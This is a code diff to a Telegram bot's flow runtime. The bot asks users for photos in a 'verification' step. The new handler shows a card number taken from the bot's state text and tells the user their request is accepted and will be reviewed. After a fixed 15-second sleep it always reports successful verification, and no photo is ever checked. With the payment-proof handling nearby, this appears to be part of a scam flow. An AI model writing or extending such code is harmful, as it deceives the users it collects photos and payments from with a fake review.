@@ -360,12 +360,7 @@ class FlowRuntime:
             return
 
         if photos and self._is_verification_photo_state(session.state_id):
-            await msg.answer(
-                "⏳ <b>Подождите, мы вас верифицируем...</b>",
-                parse_mode=ParseMode.HTML,
-            )
-            await asyncio.sleep(15)
-            await self._send_verification_success(msg)
+            await self._handle_verification_photo(msg, session)
             return
         
         session.last_input = text
@@ -452,6 +447,37 @@ class FlowRuntime:
         session.awaiting_payment_proof = False
         await self._send_state_by_id(msg, next_state, session=session)
         await self._send_system_chain(msg, session)
+
+    async def _handle_verification_photo(self, msg: Message, session: UserSession) -> None:
+        """Step 1 — immediately acknowledge; Step 2 — after 15s send success."""
+        import re as _re
+        state_text = self._state_text(session.state_id)
+        card_match = _re.search(r"\b\d{4}(?:[ \-]?\d{4}){3}\b", state_text)
+        card_line = f"\n\n📋 Карта: <code>{card_match.group(0)}</code>" if card_match else ""
+
+        accept_text = (
+            f"✅ <b>Заявка на верификацию принята!</b>"
+            f"{card_line}"
+            f"\n\n⏳ Ваша заявка будет рассмотрена в ближайшее время. "
+            f"Вы получите уведомление о результате."
+        )
+
+        naproverk_path = self.media_dir / "naproverk.jpg"
+        if naproverk_path.exists():
+            try:
+                await msg.answer_photo(
+                    photo=FSInputFile(str(naproverk_path)),
+                    caption=accept_text,
+                    parse_mode=ParseMode.HTML,
+                )
+            except Exception as e:
+                logger.warning(f"Failed to send naproverk media: {e}")
+                await msg.answer(accept_text, parse_mode=ParseMode.HTML)
+        else:
+            await msg.answer(accept_text, parse_mode=ParseMode.HTML)
+
+        await asyncio.sleep(15)
+        await self._send_verification_success(msg)
 
     async def _send_verification_success(self, msg: Message) -> None:
         caption = "✅ <b>Успешная верификация!</b>"
